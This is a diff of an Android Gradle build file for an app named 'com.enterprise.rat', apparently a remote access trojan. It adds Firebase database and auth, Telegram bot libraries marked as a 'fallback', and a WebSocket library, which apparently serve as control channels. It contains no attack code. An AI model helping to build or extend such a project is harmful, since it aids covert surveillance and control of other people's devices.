@@ -10,8 +10,8 @@ android {
         applicationId "com.enterprise.rat"
         minSdk 24
         targetSdk 34
-        versionCode 3
-        versionName "3.0-ENT"
+        versionCode 9
+        versionName "9.0-firebase"
         multiDexEnabled true
     }
 
@@ -23,7 +23,7 @@ android {
         }
 
         debug {
-            minifyEnabled true
+            minifyEnabled false
             proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
         }
     }
@@ -47,7 +47,6 @@ android {
                     'META-INF/*.kotlin_module',
                     'META-INF/{AL2.0,LGPL2.1}'
             ]
-
             pickFirsts += [
                     'META-INF/services/javax.ws.rs.ext.MessageBodyWriter'
             ]
@@ -64,12 +63,17 @@ configurations.all {
 }
 
 dependencies {
-    implementation 'com.google.android.gms:play-services-location:21.0.1'
+    // Firebase BoM
+    implementation platform('com.google.firebase:firebase-bom:33.15.0')
+    implementation 'com.google.firebase:firebase-database'
+    implementation 'com.google.firebase:firebase-auth'
 
+    // Telegram (fallback)
+    implementation('org.telegram:telegrambots:6.5.0') {
         exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
         exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
     }
-
+    implementation('org.telegram:telegrambots-meta:6.5.0') {
         exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk8'
         exclude group: 'org.jetbrains.kotlin', module: 'kotlin-stdlib-jdk7'
     }
@@ -86,17 +90,11 @@ dependencies {
     implementation 'androidx.multidex:multidex:2.0.1'
 
     implementation 'commons-io:commons-io:2.11.0'
-
-    // MATERIAL FIX COLOR PRIMARY
     implementation 'com.google.android.material:material:1.11.0'
+
+    // AndroidAsync untuk WebSocket (opsional)
+    implementation 'com.koushikdutta.async:androidasync:2.2.1'
 }
 
-// Firebase BoM (Bill of Materials)
-dependencies {
-    implementation platform('com.google.firebase:firebase-bom:33.15.0')
-    implementation 'com.google.firebase:firebase-database'
-    implementation 'com.google.firebase:firebase-auth'
-}
-
-// Google Services plugin (PASTIKAN SUDAH ADA DI BARIS PALING BAWAH)
-// apply plugin: 'com.google.gms.google-services'
+// Plugin Google Services
+apply plugin: 'com.google.gms.google-services'
